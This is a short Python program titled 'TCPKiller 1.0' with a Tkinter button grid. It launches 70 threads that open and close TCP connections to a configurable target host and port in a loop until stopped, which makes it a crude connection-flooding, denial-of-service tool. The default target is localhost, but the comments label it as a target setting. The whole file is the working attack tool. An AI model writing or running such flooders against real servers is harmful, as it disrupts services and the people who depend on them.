#coding=utf-8
import socket
import threading
import time
from tkinter import *

shouldq=0
xs=10 #x-size
ys=7 #y-size
t=1 #error-delay-time
host='127.0.0.1' #target-hostname
port=4567 #target-port
ver='1.0' #version

def k(y,x):
    global shouldq
    sta[y][x]['text']='－－'
    while shouldq==0:
        try:
            s=socket.socket()
            s.connect((host,port))
            s.close()
        except:
            sta[y][x]['text']='！！'
            time.sleep(t)
            sta[y][x]['text']='－－'
    sta[y][x]['text']='＋＋'
    return

def st():
    global shouldq
    shouldq=0
    for y in range(ys):
        for x in range(xs):
            t=threading.Thread(target=k,args=(y,x))
            t.start()
def kill():
    global shouldq
    shouldq=1

tk=Tk()
sta=[[0 for col in range(xs)] for row in range(ys)]
for y in range(ys):
    for x in range(xs):
        sta[y][x]=Button(tk,text='＋＋')
        sta[y][x].grid(column=x,row=y)
bs=Button(tk,text='开始',command=st)
bs.grid(column=xs+1,row=0)
bk=Button(tk,text='结束',command=kill)
bk.grid(column=xs+1,row=1)
tk.title('TCPKiller '+ver)
mainloop()
kill()
while(threading.activeCount()>2):pass
